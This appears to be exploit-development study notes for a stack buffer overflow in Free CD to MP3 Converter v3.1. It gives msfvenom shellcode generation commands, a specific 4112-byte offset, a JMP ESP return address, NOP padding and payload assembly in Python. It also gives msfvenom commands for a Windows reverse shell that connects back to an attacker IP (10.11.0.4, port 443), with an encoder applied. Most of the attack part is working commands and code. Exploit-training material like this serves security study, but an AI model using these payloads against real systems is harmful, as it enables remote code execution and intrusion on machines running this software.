# Stack Based Buffer Overflow 
##  Exploiting Free CD to MP3 Converter v3.1

> Creating a shellcode and jumping to it so we can have full control

### Generating a payload

`msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'`

windows/exec: 32 bit payload 
CMD='': What we want to execute
-f: Format/language we want the output in 
-b: Bad characters 

### Final Payload

1. Buffer to fill out memory before EIP b"A" * offset
2. EIP: 4 bytes as our return address -> Gotten from `8 Finding Return Instruction`
3. buf: Our shellcode

To convert JMP ESP from `hex` to an address in Little Endian, we'll use a python function called `pack` found in the `struct` library

```
	offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00457418)
    buf = "" # shellcode
```

### Shellcode Padding

Due to the salignemnt and the programs stack frame, the start of our shellcode might get skipped, in order to prevent that we can add junk padding -  `NOP Bytes`.

```
	nop = b"\x90"*32
    payload = buffer + eip + nop + buf

```



### Gaining code exec

To gain code execution change either from the above options 

1. Change payload to CMD= cmd.exe (privesc)
2. Change the msfvenom buf payload (rev shell)

	`msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python' -b "\x00\x0A\x0D"` 

This will ensure that the program will not crash after our payload fails
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
